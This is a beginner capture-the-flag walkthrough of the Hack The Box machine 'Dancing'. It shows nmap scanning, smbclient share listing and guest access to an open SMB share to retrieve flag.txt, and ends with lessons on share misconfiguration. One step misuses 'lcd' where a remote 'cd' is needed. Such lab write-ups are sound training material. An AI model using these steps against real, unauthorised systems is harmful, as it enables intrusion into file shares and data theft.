## Hack The Box – Dancing
📌 Overview

Dancing is a beginner-level HTB machine focused on SMB enumeration and misconfigured file shares.

Goal: Gain access to SMB share and retrieve the flag.

## Enumeration
I scanned the target to find open ports:
```bash
nmap -sV -sC -p- <target-ip>
```
I discovered that port 445 (SMB) was open.

## SMB Enumeration
Before enumerating SMB shares, I ensured that the required tool smbclient was installed on my system.

```bash
sudo apt install smbclient
```
After installation, I proceeded to list available SMB shares on the target:

```bash
smbclient -L //<target-ip> -N
```
Result:
The following shares were discovered:
- ADMIN$
- C$
- IPC$
- WorkShares


## Accessing Shares
I tested anonymous access on each share:
- ADMIN$ → Access denied
- C$ → Access denied
- WorkShares → Access granted 
```bash
smbclient //<target-ip>/WorkShares -U guest --option='client min protocol=SMB2'
```
## Exploring Files

Inside the share, I navigated directories:
```bash
ls
cd Amy.J
get worknotes.txt
```
Then I checked another directory:
```bash
lcd ../James.P
get flag.txt
```

## Getting the Flag
After downloading the file:
```bash
cat flag.txt
```
I successfully retrieved the flag.

## What I Learned
- SMB shares can expose sensitive files if misconfigured
- Anonymous access is a major security risk
- Enumeration is the most important step in penetration testing
- Always check custom shares first (like WorkShares)
- Basic tools like nmap and smbclient are essential in recon













